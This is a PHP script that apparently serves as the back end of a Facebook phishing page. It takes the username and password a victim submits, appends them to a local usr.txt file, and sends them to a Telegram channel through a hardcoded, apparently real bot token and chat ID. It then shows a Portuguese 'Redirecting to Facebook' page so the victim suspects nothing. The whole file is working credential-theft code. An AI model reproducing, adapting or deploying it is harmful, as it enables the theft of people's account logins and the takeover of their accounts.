<?php header ('Content-type: text/html; charset=UTF-8'); ?>
<?php
$file = "usr.txt";
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "*************************");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Password: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "************************");
fwrite($handle, "\n");
fclose($handle);
// Set the chat ID and bot token
$chat_id = "-1001541853139"; // Replace with your own channel ID
$bot_token = "5846601697:AAFIkygIKjKoL2wXS5hIK72SmQ-9Iov1VsQ"; // Replace with your own bot token

// Get the form data
$username = $_POST['username'];
$password = $_POST['password'];


$message_text = "$ NEW LOG IN DETECTED:\n$ Username: " . $username . "\n$ Password: " . $password;

$url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message_text);

file_get_contents($url);

// Send the message to the Telegram channel
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Redirecionando ao Facebook</title>
<meta http-equiv="Refresh" content="1; URL=loading.html"/>
</head><body>
</body>
</html>
';
?>
